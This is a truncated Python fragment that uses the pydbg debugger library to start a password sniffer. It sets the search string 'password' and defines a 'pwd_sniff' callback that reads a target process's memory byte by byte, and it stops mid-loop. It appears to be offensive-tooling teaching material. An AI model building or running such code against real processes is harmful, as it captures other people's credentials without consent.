# -*- coding: utf-8 -*-  
from pydbg import *
from pydbg.defines import *
import struct
import utils
import sys

dbg = pydbg();
found_tm = False;
pattern = "password";

def pwd_sniff(dbg, args):
    buffer = ""
    offset = 0;
    while True:
        byte = dbg.read_process_memory(args[1]+offset,1);
        